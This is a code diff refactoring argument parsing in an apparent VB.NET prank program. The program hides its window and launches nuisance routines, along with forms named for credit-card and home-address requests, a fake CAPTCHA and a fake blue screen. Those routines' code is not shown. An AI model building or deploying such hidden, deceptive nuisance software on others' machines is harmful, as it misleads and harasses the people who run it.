@@ -2,105 +2,110 @@
 Imports System.Text
 Imports IWshRuntimeLibrary
 Public Class Principal
-    Dim Argumentos As String
+    Public Argumentos As String
 
     Private Sub Principal_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Hide()
         Argumentos = Command()
-        LeerArgumentos(Argumentos)
+        LeerArgumentos()
     End Sub
 
 #Region "Startup"
-    Sub LeerArgumentos(ByVal parametro As String)
+    Sub LeerArgumentos()
         Me.Hide()
         Try
-            If parametro = Nothing Then
+            If Argumentos = Nothing Then
                 'Iniciador de los demas
                 Alborotador()
-            ElseIf parametro = "/PlaySongs" Then
+            ElseIf Argumentos = "/PlaySongs" Then
                 PlaySongs()
-            ElseIf parametro = "/SerMolesto" Then
+            ElseIf Argumentos = "/SerMolesto" Then
                 SoyMolesto()
-            ElseIf parametro = "/KeyCaps" Then
+            ElseIf Argumentos = "/KeyCaps" Then
                 KeyCaps()
-            ElseIf parametro = "/CloseIt" Then
+            ElseIf Argumentos = "/CloseIt" Then
                 CloseIt()
-            ElseIf parametro = "/RefreshIt" Then
+            ElseIf Argumentos = "/RefreshIt" Then
                 RefreshIt()
-            ElseIf parametro = "/PocasCarpetas" Then
+            ElseIf Argumentos = "/PocasCarpetas" Then
                 PocasCarpetas()
-            ElseIf parametro = "/Hablar" Then
+            ElseIf Argumentos = "/Hablar" Then
                 Hablar()
-            ElseIf parametro.StartsWith("/AnimeGirlWantsCreditCardInfo") Then
-                parametro = parametro.Replace("/AnimeGirlWantsCreditCardInfo", Nothing).TrimStart
+            ElseIf Argumentos.StartsWith("/AnimeGirlWantsCreditCardInfo") Then
+                Argumentos = Argumentos.Replace("/AnimeGirlWantsCreditCardInfo", Nothing).TrimStart
+                Dim contenido As String = Nothing
                 Try
-                    Dim args() As String = parametro.Split(" ")
-                    Dim contenido As String = Nothing
+                    Dim args() As String = Argumentos.Split(" ")
                     For Each item As String In args
                         contenido &= item & " "
                     Next
-                    AnimeGirlWantsCreditCardInfo.Show()
-                    AnimeGirlWantsCreditCardInfo.ReadParameters(contenido)
                 Catch
                 End Try
+                AnimeGirlWantsCreditCardInfo.ReadParameters(contenido)
                 AnimeGirlWantsCreditCardInfo.ReadValues()
+                AnimeGirlWantsCreditCardInfo.Show()
                 AnimeGirlWantsCreditCardInfo.Focus()
-            ElseIf parametro.StartsWith("/AnimeSomeoneWantsToKnowWhereYouLive") Then
-                parametro = parametro.Replace("/AnimeSomeoneWantsToKnowWhereYouLive", Nothing).TrimStart
+
+            ElseIf Argumentos.StartsWith("/AnimeSomeoneWantsToKnowWhereYouLive") Then
+                Argumentos = Argumentos.Replace("/AnimeSomeoneWantsToKnowWhereYouLive", Nothing).TrimStart
+                Dim contenido As String = Nothing
                 Try
-                    Dim args() As String = parametro.Split(" ")
-                    Dim contenido As String = Nothing
+                    Dim args() As String = Argumentos.Split(" ")
                     For Each item As String In args
                         contenido &= item & " "
                     Next
-                    AnimeSomeoneWantsToKnowWhereYouLive.Show()
-                    AnimeSomeoneWantsToKnowWhereYouLive.ReadParameters(contenido)
                 Catch
                 End Try
+                AnimeSomeoneWantsToKnowWhereYouLive.ReadParameters(contenido)
                 AnimeSomeoneWantsToKnowWhereYouLive.ReadValues()
+                AnimeSomeoneWantsToKnowWhereYouLive.Show()
                 AnimeSomeoneWantsToKnowWhereYouLive.Focus()
-            ElseIf parametro.StartsWith("/ItsASimpleQuestion") Then
-                parametro = parametro.Replace("/ItsASimpleQuestion", Nothing).TrimStart
+
+            ElseIf Argumentos.StartsWith("/ItsASimpleQuestion") Then
+                Argumentos = Argumentos.Replace("/ItsASimpleQuestion", Nothing).TrimStart
+                Dim contenido As String = Nothing
                 Try
-                    Dim args() As String = parametro.Split(" ")
-                    Dim contenido As String = Nothing
+                    Dim args() As String = Argumentos.Split(" ")
                     For Each item As String In args
                         contenido &= item & " "
                     Next
-                    ItsASimpleQuestion.Show()
-                    ItsASimpleQuestion.ReadParameters(contenido)
                 Catch
                 End Try
+                ItsASimpleQuestion.ReadParameters(contenido)
                 ItsASimpleQuestion.ReadValues()
+                ItsASimpleQuestion.Show()
                 ItsASimpleQuestion.Focus()
-            ElseIf parametro.StartsWith("/IsJustCAPTCHA") Then
-                parametro = parametro.Replace("/IsJustCAPTCHA", Nothing).TrimStart
+
+            ElseIf Argumentos.StartsWith("/IsJustCAPTCHA") Then
+                Argumentos = Argumentos.Replace("/IsJustCAPTCHA", Nothing).TrimStart
+                Dim contenido As String = Nothing
                 Try
-                    Dim args() As String = parametro.Split(" ")
-                    Dim contenido As String = Nothing
+                    Dim args() As String = Argumentos.Split(" ")
                     For Each item As String In args
                         contenido &= item & " "
                     Next
-                    IsJustCAPTCHA.Show()
-                    IsJustCAPTCHA.ReadParameters(contenido)
                 Catch
                 End Try
+                IsJustCAPTCHA.ReadParameters(contenido)
                 IsJustCAPTCHA.ReadValues()
+                IsJustCAPTCHA.Show()
                 IsJustCAPTCHA.Focus()
-            ElseIf parametro.StartsWith("/IsJustBSOD") Then
-                parametro = parametro.Replace("/IsJustBSOD", Nothing).TrimStart
+
+            ElseIf Argumentos.StartsWith("/IsJustBSOD") Then
+                Argumentos = Argumentos.Replace("/IsJustBSOD", Nothing).TrimStart
+                Dim contenido As String = Nothing
                 Try
-                    Dim args() As String = parametro.Split(" ")
-                    Dim contenido As String = Nothing
+                    Dim args() As String = Argumentos.Split(" ")
                     For Each item As String In args
                         contenido &= item & " "
                     Next
-                    IsJustBSOD.Show()
-                    IsJustBSOD.ReadParameters(contenido)
                 Catch
                 End Try
+                IsJustBSOD.ReadParameters(contenido)
                 IsJustBSOD.ReadValues()
+                IsJustBSOD.Show()
                 IsJustBSOD.Focus()
+
             End If
         Catch ex As Exception
 
